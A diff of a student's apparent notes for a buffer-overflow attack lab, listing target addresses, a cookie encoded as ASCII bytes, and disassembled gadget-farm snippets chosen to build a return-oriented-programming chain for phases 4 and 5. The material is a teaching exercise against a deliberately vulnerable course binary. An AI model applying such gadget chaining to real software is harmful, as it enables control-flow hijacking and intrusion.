@@ -18,7 +18,7 @@ break:0x0000000000401916
 
 Phase_4:
 touch2:00000000004017ec
-start_farm --- mid_farm:line 104 --- line 192
+start_farm --- mid_farm:line 915 --- line 1087
     11cc:	c7 00 48 89 c7 90    	movl   $0x90c78948,(%rax)
     11d2:	90                   	nop
     11d3:	5d                   	pop    %rbp
@@ -33,3 +33,34 @@ start_farm --- mid_farm:line 104 --- line 192
     11e3:	c3          
     58 : pop rax
     c3:  ret
+
+Phase_5:
+touch3_addr:00000000004018fa
+my_cookie:0x59b997fa
+tranf_into_ascii: 35 39 62 39 39 37 66 61
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	ret    
+pop $rsp ---mov eax,edx
+
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	ret   
+mov eax,edi
+
+  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+  401a2b:	c3                   	ret    
+mov ecx,esi
+
+  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
+  401a6d:	c3                   	ret   
+mov edx,ecx
+
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	ret   
+mov rsp,rax 
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret   
+pop rax
+
+
